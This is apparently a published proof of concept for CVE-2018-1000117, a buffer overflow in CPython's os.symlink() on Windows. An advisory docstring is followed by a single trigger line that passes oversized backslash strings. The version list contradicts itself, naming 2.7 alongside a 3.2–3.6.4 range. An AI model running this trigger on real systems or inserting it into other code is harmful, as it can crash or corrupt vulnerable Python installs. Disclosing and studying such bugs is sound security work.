import os
"""
On February 27th, 2018, the Python Security Response team was notified of a buffer overflow issue in the os.symlink() method on Windows. The issue affects all versions of Python between 3.2 and 3.6.4, including the 3.7 beta releases. It has been patched for the next releases of 3.4, 3.5, 3.6 and 3.7.
Vulnerable Versions
- Python 2.7
- Python 3.4
- Python 3.5
- Python 3.6
Reported by: Alexey Izbyshev
#########################
Exploit : 1337r00t (@_1337r00t)
CVE : CVE-2018-1000117
Description : Python Software Foundation CPython version From 3.2 until 3.6.4 on Windows contains a Buffer Overflow vulnerability in os.symlink() function on Windows that can result in Arbitrary code execution, likely escalation of privilege. This attack appears to be exploitable via a python script that creates a symlink with an attacker controlled name or location. This vulnerability appears to have been fixed in 3.7.0 and 3.6.5.
Published: 2018-03-07
"""
os.symlink(b'x\\' * 129, b'y\\' * 129)
